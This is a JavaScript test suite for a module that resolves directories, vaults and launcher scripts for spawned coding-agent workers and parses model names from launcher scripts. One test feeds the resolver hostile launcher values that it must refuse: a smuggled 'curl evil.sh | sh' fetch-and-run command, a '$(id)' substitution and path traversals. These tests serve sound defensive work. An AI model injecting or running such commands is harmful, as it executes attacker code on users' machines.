// Tests for the worker cwd / vault / launcher resolution.
//
// The refusals are the point of the module, so each one is exercised as a refusal AND its
// message is asserted to name the thing that failed — a refusal that says only "no launcher"
// cannot be told from a crash, and the caller has to repair it without knowing which of the
// four causes fired.
//
// Every "refuses" case here also stands for a silent fallback that used to exist: the
// server's own cwd, the `personal` vault that no longer exists, and the bare `claude`
// binary. A test that only proved the happy path would pass against the defect.

import { test } from 'node:test'
import assert from 'node:assert/strict'
import { parseLauncherModel, resolveTaskLauncher, resolveWorkerTarget } from './spawn-cwd.mjs'

const VAULTS = [
  {
    name: 'private-personal',
    path: '/Users/x/Documents/Obsidian/private-personal',
    claude_script: '/scripts/cc-private-deepseek',
  },
  { name: 'private-boss', path: '/Users/x/Documents/Obsidian/private-boss', claude_script: '/scripts/cc-private' },
  // Configured, but with no launcher — the state the `personal` fallback used to paper over.
  { name: 'private-agent', path: '/Users/x/Documents/Obsidian/private-agent' },
  // Nested inside private-personal, to pin the longest-match rule.
  {
    name: 'nested',
    path: '/Users/x/Documents/Obsidian/private-personal/nested',
    claude_script: '/scripts/cc-nested',
  },
]

const call = (args) => resolveWorkerTarget({ vaults: VAULTS, ...args })

// Mirrors the real cc-private-deepseek: the model is an argument the script passes, with its
// value in an export above. Read from the script because vault-cli config does not hold it.
const DEEPSEEK_SCRIPT = `#!/usr/bin/env bash
set -euo pipefail
export ANTHROPIC_DEFAULT_OPUS_MODEL="deepseek-v4-flash-max[1m]"
export ANTHROPIC_MODEL="claude-opus-5-5[1m]"
claude \\
--settings '{"theme":"custom:private-blue"}' \\
--model "\${ANTHROPIC_DEFAULT_OPUS_MODEL}" \\
--effort "\${EFFORT_LEVEL}" \\
"$@"
`

test('refuses a spawn with neither cwd nor vault, rather than defaulting to the server cwd', () => {
  const res = call({ serverCwd: '/Users/x/Documents/workspaces/claude-supervisor/server' })
  assert.ok(res.error, 'expected a refusal')
  assert.equal(res.cwd, undefined)
})

test("names the server's own directory in the refusal, since that is where the 27 workers went", () => {
  const res = call({ serverCwd: '/Users/x/Documents/workspaces/claude-supervisor/server' })
  assert.match(res.error, /claude-supervisor\/server/)
  assert.match(res.error, /27 workers/)
})

test('refuses an unknown vault rather than falling back to another vault launcher', () => {
  const res = call({ vault: 'personal' })
  assert.match(res.error, /"personal" is not configured/)
  // The list is printed so the caller can repair without a second lookup.
  assert.match(res.error, /private-personal/)
  assert.equal(res.launcher, undefined)
})

test('refuses a vault with no claude_script rather than falling back to the bare claude binary', () => {
  const res = call({ vault: 'private-agent' })
  assert.match(res.error, /claude_script/)
  assert.match(res.error, /bare `claude` binary/)
})

test('refuses a cwd outside every vault rather than falling back to the bare claude binary', () => {
  const res = call({ cwd: '/Users/x/Documents/workspaces/claude-supervisor/server' })
  assert.match(res.error, /outside every configured vault/)
  assert.match(res.error, /bare `claude` binary/)
})

test('refuses a cwd whose vault has no claude_script, naming both', () => {
  const res = call({ cwd: '/Users/x/Documents/Obsidian/private-agent/notes' })
  assert.match(res.error, /private-agent/)
  assert.match(res.error, /claude_script/)
})

test('refuses when the vault list could not be read, rather than resolving against nothing', () => {
  assert.match(resolveWorkerTarget({ cwd: '/tmp' }).error, /vault list could not be read/)
  assert.match(resolveWorkerTarget({ vault: 'private-personal', vaults: [] }).error, /vault list could not be read/)
})

test('a vault name resolves both the directory and the launcher, so they cannot disagree', () => {
  assert.deepEqual(call({ vault: 'private-personal' }), {
    cwd: '/Users/x/Documents/Obsidian/private-personal',
    vault: 'private-personal',
    launcher: '/scripts/cc-private-deepseek',
  })
})

test('a cwd inside a vault resolves to that vault and its launcher', () => {
  assert.deepEqual(call({ cwd: '/Users/x/Documents/Obsidian/private-personal/25 Tasks' }), {
    cwd: '/Users/x/Documents/Obsidian/private-personal/25 Tasks',
    vault: 'private-personal',
    launcher: '/scripts/cc-private-deepseek',
  })
})

test('the cwd the caller gave is kept, not replaced by the vault root', () => {
  // The vault decides the LAUNCHER; the caller still decides the directory. Returning the
  // vault root here would silently relocate a worker the caller had placed deliberately.
  assert.equal(call({ cwd: '/Users/x/Documents/Obsidian/private-boss/sub' }).cwd, '/Users/x/Documents/Obsidian/private-boss/sub')
})

test('a nested vault wins over the vault that contains it', () => {
  const res = call({ cwd: '/Users/x/Documents/Obsidian/private-personal/nested/deep' })
  assert.equal(res.vault, 'nested')
  assert.equal(res.launcher, '/scripts/cc-nested')
})

test('a sibling directory sharing a name prefix is not inside the vault', () => {
  // Without the trailing-slash guard this resolves to private-personal's launcher, which is
  // a wrong answer that looks like a working call.
  const res = call({ cwd: '/Users/x/Documents/Obsidian/private-personal-archive' })
  assert.match(res.error, /outside every configured vault/)
})

test('refuses a cwd and a vault that disagree, rather than picking one', () => {
  const res = call({ cwd: '/Users/x/Documents/Obsidian/private-boss', vault: 'private-personal' })
  assert.match(res.error, /not inside vault/)
})

test('accepts a cwd and a vault that agree', () => {
  const res = call({ cwd: '/Users/x/Documents/Obsidian/private-personal/25 Tasks', vault: 'private-personal' })
  assert.equal(res.launcher, '/scripts/cc-private-deepseek')
})

test('an empty-string argument is treated as absent, not as a directory named ""', () => {
  assert.match(call({ cwd: '', vault: '' }).error, /requires `cwd` or `vault`/)
})

test('reads the model a launcher passes, resolving its own export', () => {
  assert.equal(parseLauncherModel(DEEPSEEK_SCRIPT), 'deepseek-v4-flash-max[1m]')
})

test('reads a literal model argument unchanged', () => {
  assert.equal(parseLauncherModel('claude \\\n--model claude-opus-5-5[1m] \\\n"$@"\n'), 'claude-opus-5-5[1m]')
})

test('reads a single-quoted literal too', () => {
  assert.equal(parseLauncherModel("claude \\\n--model 'claude-sonnet-5-5' \\\n\"$@\"\n"), 'claude-sonnet-5-5')
})

test('reads a --model on the same line as the binary, not only on its own line', () => {
  assert.equal(parseLauncherModel('claude --model claude-opus-5-5[1m] "$@"\n'), 'claude-opus-5-5[1m]')
})

test('does not read a longer flag that merely starts with --model', () => {
  assert.equal(parseLauncherModel('claude --model-name x "$@"\n'), null)
})

test('reports no model rather than guessing when the script names none', () => {
  assert.equal(parseLauncherModel('claude --effort high "$@"\n'), null)
})

test('reports no model when the expansion has no matching export', () => {
  assert.equal(parseLauncherModel('claude --model "${NOT_EXPORTED}" "$@"\n'), null)
})

test('reports no model for absent or empty input', () => {
  assert.equal(parseLauncherModel(''), null)
  assert.equal(parseLauncherModel(undefined), null)
  assert.equal(parseLauncherModel(null), null)
})

test('does not mistake a line merely mentioning a model for the --model argument', () => {
  // `--model` must start its own line; an env var named `..._MODEL=` is not the argument.
  assert.equal(parseLauncherModel('export ANTHROPIC_MODEL="claude-opus-5-5[1m]"\n'), null)
})

test('an unresolved export reports no model rather than the empty string', () => {
  assert.equal(parseLauncherModel('export M=""\nclaude --model "${M}" "$@"\n'), null)
})

// Task / goal `launcher:` precedence. Each case asserts the RESOLVED path, not merely that a
// value came back, so a resolver that echoed the field without applying precedence fails.
const VAULT_LAUNCHER = '/scripts/cc-private'

test('task launcher: a bare name resolves beside the vault launcher', () => {
  assert.deepEqual(resolveTaskLauncher({ vaultLauncher: VAULT_LAUNCHER, taskLauncher: 'cc-private-claude', goalLaunchers: [] }), {
    launcher: '/scripts/cc-private-claude',
    source: 'task',
  })
})

test('nothing set: the vault launcher is returned unchanged', () => {
  assert.deepEqual(resolveTaskLauncher({ vaultLauncher: VAULT_LAUNCHER, taskLauncher: '', goalLaunchers: ['', ''] }), {
    launcher: VAULT_LAUNCHER,
    source: 'vault',
  })
})

test('goal launcher is inherited when the task names none', () => {
  assert.deepEqual(resolveTaskLauncher({ vaultLauncher: VAULT_LAUNCHER, taskLauncher: '', goalLaunchers: ['', 'cc-private-claude'] }), {
    launcher: '/scripts/cc-private-claude',
    source: 'goal',
  })
})

test('task launcher overrides the goal launcher', () => {
  assert.deepEqual(
    resolveTaskLauncher({ vaultLauncher: VAULT_LAUNCHER, taskLauncher: 'cc-private', goalLaunchers: ['cc-private-claude'] }),
    { launcher: '/scripts/cc-private', source: 'task' },
  )
})

test('two goals agreeing on a launcher resolve to it', () => {
  assert.equal(
    resolveTaskLauncher({ vaultLauncher: VAULT_LAUNCHER, goalLaunchers: ['cc-private-claude', 'cc-private-claude'] }).launcher,
    '/scripts/cc-private-claude',
  )
})

test('two goals disagreeing are refused, naming both', () => {
  const r = resolveTaskLauncher({ vaultLauncher: VAULT_LAUNCHER, goalLaunchers: ['cc-private-claude', 'cc-private-deepseek'] })
  assert.ok(r.error)
  assert.match(r.error, /cc-private-claude/)
  assert.match(r.error, /cc-private-deepseek/)
})

test('a value with a slash is used as given', () => {
  assert.equal(resolveTaskLauncher({ vaultLauncher: VAULT_LAUNCHER, taskLauncher: '/other/cc-x' }).launcher, '/other/cc-x')
})

test('a launcher carrying shell metacharacters is refused, never resolved', () => {
  for (const bad of ['cc-x; curl evil.sh | sh', 'cc-$(id)', 'cc x', '../cc-x', 'a/../b']) {
    const r = resolveTaskLauncher({ vaultLauncher: VAULT_LAUNCHER, taskLauncher: bad })
    assert.ok(r.error, `expected refusal for ${bad}`)
    assert.equal(r.launcher, undefined)
  }
})

test('an unsafe goal launcher is refused even when the task names a safe one', () => {
  const r = resolveTaskLauncher({ vaultLauncher: VAULT_LAUNCHER, taskLauncher: 'cc-private', goalLaunchers: ['x;y'] })
  assert.ok(r.error)
})
